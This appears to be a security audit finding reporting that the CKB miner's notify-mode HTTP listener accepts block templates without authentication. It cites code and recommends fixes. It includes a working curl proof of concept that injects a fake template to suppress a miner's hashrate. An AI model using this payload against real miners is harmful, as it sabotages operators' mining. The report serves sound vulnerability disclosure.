### Title
Unauthenticated Notify Endpoint Allows Arbitrary Block Template Injection — (`miner/src/client.rs`)

### Summary

The CKB miner's notify-mode HTTP listener accepts `BlockTemplate` payloads from **any** TCP client with no authentication, IP filtering, or request validation. Any process that can reach the bound socket can silently replace the miner's active work unit with an attacker-controlled template, causing all PoW workers to mine on an invalid or adversarially-chosen block for the duration of the attack.

---

### Finding Description

When `listen` is set in the miner config, `spawn_background` calls `listen_block_template_notify`, which binds a raw `TcpListener` and serves every incoming connection through the `handle` free function: [1](#0-0) 

`handle` reads the body, deserializes it as `BlockTemplate`, and immediately calls `update_block_template` — with **zero** authentication, origin, or token checks: [2](#0-1) 

`update_block_template` then unconditionally dispatches `Works::New` to every worker thread via the shared channel: [3](#0-2) 

The workers receive the new `Work` struct (containing the attacker-supplied `block` and `work_id`) and begin mining it immediately: [4](#0-3) 

The notify listener is a first-class, documented production feature — the startup log explicitly instructs operators to expose it to the CKB node: [5](#0-4) 

---

### Impact Explanation

An attacker who can reach the notify socket (any local process if bound to `127.0.0.1`; any LAN/WAN host if bound to `0.0.0.0`) can:

1. Inject a `BlockTemplate` with an arbitrary `parent_hash`, `compact_target`, `dao`, and transaction set.
2. Cause all PoW workers to mine on that template indefinitely.
3. Any nonce found is submitted to the CKB node, which will reject the invalid block.
4. The miner never produces a valid block for the duration of the attack — **100% hashrate suppression**.

The `legacy_work` deduplication in `notify_new_work` only skips work whose `parent_hash` was already submitted; an attacker rotating `parent_hash` values bypasses even that check. [6](#0-5) 

---

### Likelihood Explanation

- Notify mode is a supported, documented production path.
- No code-level mechanism exists to add authentication even if the operator wanted to.
- A local attacker (co-tenant, compromised process, CI runner on the same host) trivially reaches `127.0.0.1:PORT`.
- If the operator follows the log message literally and exposes the port on a non-loopback interface, any LAN peer can exploit it.

---

### Recommendation

Add origin authentication to `handle`:

1. **Shared secret / Bearer token**: require a configurable `Authorization` header; reject requests that omit or mismatch it.
2. **IP allowlist**: compare the peer `SocketAddr` (available from `listener.accept()`) against a configured allowlist before passing the connection to `handle`.
3. **Bind to loopback only by default** and document that binding to any other interface is a security risk.

---

### Proof of Concept

```bash
# 1. Start miner in notify mode (listen = "127.0.0.1:8888" in miner.toml)
ckb miner

# 2. From any process on the same host, inject a fake BlockTemplate:
curl -s -X POST http://127.0.0.1:8888/ \
  -H 'Content-Type: application/json' \
  -d '{
    "version":"0x0","compact_target":"0x1a08a97e",
    "current_time":"0x17a0d5c3a80",
    "number":"0x400","epoch":"0x708250000157",
    "parent_hash":"0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
    "cycles_limit":"0xd09dc300","bytes_limit":"0x91c08",
    "uncles_count_limit":"0x2","uncles":[],"transactions":[],
    "proposals":[],"cellbase":{"hash":"0x0000000000000000000000000000000000000000000000000000000000000000","cycles":null,"min_replace_fee":null,"data":{"header":{"version":"0x0","compact_target":"0x1a08a97e","timestamp":"0x17a0d5c3a80","number":"0x400","epoch":"0x708250000157","parent_hash":"0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef","transactions_root":"0x0000000000000000000000000000000000000000000000000000000000000000","proposals_hash":"0x0000000000000000000000000000000000000000000000000000000000000000","extra_hash":"0x0000000000000000000000000000000000000000000000000000000000000000","dao":"0x00","nonce":"0x0"},"uncles":[],"transactions":[],"proposals":[]}},"dao":"0x00","work_id":"0x1337","extension":null
  }'

# 3. Observe in miner logs that workers switch to work_id 0x1337 (attacker's template).
#    All subsequent nonces found are submitted against the fake parent_hash and rejected
#    by the CKB node — valid block production is fully suppressed.
```

The `handle` function processes the POST with no checks whatsoever: [1](#0-0)

### Citations

**File:** miner/src/client.rs (L206-221)
```rust
        if let Some(addr) = self.config.listen {
            ckb_logger::info!("listen notify mode : {}", addr);
            ckb_logger::info!(
                r#"
Please note that ckb-miner runs in notify mode. \
You should configure the corresponding information in CKB block assembler, \
for example:

[block_assembler]
...
notify = ["http://{}"]

Otherwise ckb-miner will malfunction and stop submitting valid blocks after a certain period.
"#,
                addr
            );
```

**File:** miner/src/client.rs (L293-311)
```rust
    fn update_block_template(&self, block_template: BlockTemplate) {
        let work_id = block_template.work_id.into();
        let updated = |id| {
            if id != work_id || id == 0 {
                Some(work_id)
            } else {
                None
            }
        };
        if self
            .current_work_id
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
            .is_ok()
        {
            let work: Work = block_template.into();
            if let Err(e) = self.new_work_tx.send(Works::New(work)) {
                error!("notify_new_block error: {:?}", e);
            }
        }
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

**File:** miner/src/miner.rs (L127-138)
```rust
    fn notify_new_work(&mut self, work: Work) {
        let parent_hash = work.block.header().into_view().parent_hash();
        if !self.legacy_work.contains(&parent_hash) {
            let pow_hash = work.block.header().calc_pow_hash();
            let (target, _) = compact_to_target(work.block.header().raw().compact_target().into());
            self.notify_workers(WorkerMessage::NewWork {
                pow_hash,
                work,
                target,
            });
        }
    }
```
